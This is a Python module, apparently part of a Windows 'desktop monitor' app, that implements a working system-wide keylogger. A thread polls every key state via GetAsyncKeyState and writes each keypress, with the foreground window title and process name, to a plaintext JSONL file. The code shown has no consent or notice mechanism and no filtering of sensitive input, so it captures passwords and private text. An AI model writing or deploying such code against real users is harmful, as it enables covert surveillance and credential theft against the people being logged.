"""Keyboard event capture for the Windows desktop monitor."""

from __future__ import annotations

import ctypes
import json
import os
import threading
import time
import traceback
from ctypes import wintypes
from pathlib import Path
from typing import Any

from app.env import writable_runtime_path

PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
KEYBOARD_KEY_MIN = 8
KEYBOARD_KEY_MAX = 254
POLL_INTERVAL_SECONDS = 0.05
DATA_ROOT = writable_runtime_path(
    os.getenv("RIGWEDA_MONITOR_DATA_ROOT", r"%LOCALAPPDATA%\rigweda-monitor\data"),
    "data",
)
LOG_DIR = writable_runtime_path(
    os.getenv("RIGWEDA_MONITOR_LOG_ROOT", str(DATA_ROOT.parent / "logs")),
    "logs",
)
KEYBOARD_EVENTS_FILE = DATA_ROOT / "keyboard_events.jsonl"
LOG_FILE = LOG_DIR / "keyboard_monitor.log"

_VK_NAMES: dict[int, str] = {
    8: "Backspace",
    9: "Tab",
    13: "Enter",
    16: "Shift",
    17: "Ctrl",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: "Space",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "LeftArrow",
    38: "UpArrow",
    39: "RightArrow",
    40: "DownArrow",
    45: "Insert",
    46: "Delete",
    91: "LeftWindows",
    92: "RightWindows",
    93: "ContextMenu",
    144: "NumLock",
    145: "ScrollLock",
    160: "LeftShift",
    161: "RightShift",
    162: "LeftCtrl",
    163: "RightCtrl",
    164: "LeftAlt",
    165: "RightAlt",
}


def log_message(message: object, *, exc_info: bool = False) -> None:
    try:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        with LOG_FILE.open("a", encoding="utf-8") as log_file:
            log_file.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')} {message}\n")
            if exc_info:
                traceback.print_exc(file=log_file)
    except OSError:
        pass


def _get_active_window_info() -> dict[str, Any]:
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32

    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return {
            "window_title": "",
            "process_id": None,
            "process_name": "",
        }

    title_length = user32.GetWindowTextLengthW(hwnd)
    buffer = ctypes.create_unicode_buffer(title_length + 1)
    user32.GetWindowTextW(hwnd, buffer, title_length + 1)

    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    process_id = pid.value

    process_name = ""
    if process_id:
        handle = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, process_id)
        if handle:
            try:
                path_buffer = ctypes.create_unicode_buffer(32768)
                size = wintypes.DWORD(len(path_buffer))
                if kernel32.QueryFullProcessImageNameW(handle, 0, path_buffer, ctypes.byref(size)):
                    process_name = Path(path_buffer.value).name
            finally:
                kernel32.CloseHandle(handle)

    return {
        "window_title": buffer.value or "",
        "process_id": process_id,
        "process_name": process_name or "",
    }


def _virtual_key_name(vk: int) -> str:
    if vk in _VK_NAMES:
        return _VK_NAMES[vk]

    if 0x30 <= vk <= 0x39:
        return chr(vk)
    if 0x41 <= vk <= 0x5A:
        return chr(vk)
    if 0x70 <= vk <= 0x7B:
        return f"F{vk - 0x6F}"

    mapped = ctypes.windll.user32.MapVirtualKeyW(vk, 2)
    if mapped:
        return chr(mapped)

    return f"VK_{vk}"


class KeyboardMonitor:
    def __init__(self) -> None:
        self._stop_event = threading.Event()
        self._thread = threading.Thread(target=self._run, name="KeyboardMonitor", daemon=False)
        self._pressed_keys: set[int] = set()

    def start(self) -> bool:
        try:
            DATA_ROOT.mkdir(parents=True, exist_ok=True)
            LOG_DIR.mkdir(parents=True, exist_ok=True)
            self._thread.start()
            return True
        except Exception as error:
            log_message(f"Keyboard monitor start failed: {error}", exc_info=True)
            return False

    def stop(self) -> None:
        self._stop_event.set()
        self._thread.join(timeout=2)

    def _run(self) -> None:
        user32 = ctypes.windll.user32
        while not self._stop_event.is_set():
            try:
                event_written = False
                window_info = _get_active_window_info()
                timestamp = time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime())
                for vk in range(KEYBOARD_KEY_MIN, KEYBOARD_KEY_MAX + 1):
                    state = user32.GetAsyncKeyState(vk)
                    if state & 0x8000:
                        if vk not in self._pressed_keys:
                            self._pressed_keys.add(vk)
                            event = {
                                "timestamp": timestamp,
                                "key": _virtual_key_name(vk),
                                "virtual_key": vk,
                                "window_title": window_info["window_title"],
                                "process_id": window_info["process_id"],
                                "process_name": window_info["process_name"],
                            }
                            with KEYBOARD_EVENTS_FILE.open("a", encoding="utf-8") as log_file:
                                log_file.write(json.dumps(event, ensure_ascii=False) + "\n")
                            event_written = True
                    else:
                        self._pressed_keys.discard(vk)

                if event_written:
                    log_message("Keyboard events written.")
            except Exception as error:
                log_message(f"Keyboard monitor error: {error}", exc_info=True)
            finally:
                time.sleep(POLL_INTERVAL_SECONDS)


_keyboard_monitor: KeyboardMonitor | None = None


def start_keyboard_monitor() -> tuple[bool, str]:
    global _keyboard_monitor
    _keyboard_monitor = KeyboardMonitor()
    if _keyboard_monitor.start():
        return True, "Keyboard monitor started."
    return False, "Keyboard monitor failed to start."


def main() -> int:
    monitor = KeyboardMonitor()
    if not monitor.start():
        return 1
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        monitor.stop()
    return 0
